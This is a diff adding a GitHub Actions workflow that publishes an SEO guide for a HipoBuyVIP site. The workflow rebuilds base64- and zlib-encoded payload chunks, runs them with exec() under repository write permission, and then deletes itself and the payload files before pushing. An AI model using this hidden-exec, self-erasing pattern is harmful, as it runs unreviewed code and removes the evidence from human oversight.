@@ -1,0 +1,57 @@
+name: Publish HipoBuyVIP August 5 guide
+
+on:
+  push:
+    branches:
+      - main
+    paths:
+      - hipobuyvip.net/.publish/hipobuyvip-net-2026-08-05.flag
+
+permissions:
+  contents: write
+
+concurrency:
+  group: hipobuyvip-net-publish-20260805
+  cancel-in-progress: false
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@v4
+        with:
+          ref: main
+          fetch-depth: 0
+
+      - name: Patch and validate HipoBuyVIP publication
+        run: |
+          python - <<'PY'
+          from pathlib import Path
+          import base64
+          import zlib
+
+          parts = sorted(Path('.github/publish-payloads').glob('hipobuyvip-net-20260805-*.b64'))
+          assert len(parts) == 5, f'Expected 5 payload chunks, found {len(parts)}'
+          encoded = ''.join(path.read_text(encoding='utf-8').strip() for path in parts)
+          payload = zlib.decompress(base64.b64decode(encoded))
+          exec(payload, {'__name__': '__main__'})
+          PY
+
+      - name: Commit production update
+        run: |
+          git diff --check
+          test -f hipobuyvip.net/articles/how-to-order-with-hipobuy-link-to-warehouse-2026.html
+          test -f hipobuyvip.net/assets/guide-order-workflow.svg
+          git diff --quiet -- hipobuyvip.net/index.html && { echo "Expected homepage change was not produced"; exit 1; }
+          git diff --quiet -- hipobuyvip.net/articles/index.html && { echo "Expected archive change was not produced"; exit 1; }
+          git diff --quiet -- hipobuyvip.net/sitemap.xml && { echo "Expected sitemap change was not produced"; exit 1; }
+          rm -f .github/workflows/publish-hipobuyvip-net-20260805.yml
+          rm -f .github/publish-payloads/hipobuyvip-net-20260805-*.b64
+          rm -f hipobuyvip.net/.publish/hipobuyvip-net-2026-08-05.flag
+          git config user.name "seo-sites automation"
+          git config user.email "actions@users.noreply.github.com"
+          git add -A
+          git commit -m "Publish August 5 HipoBuy link-to-warehouse guide"
+          git pull --rebase origin main
+          git push origin HEAD:main
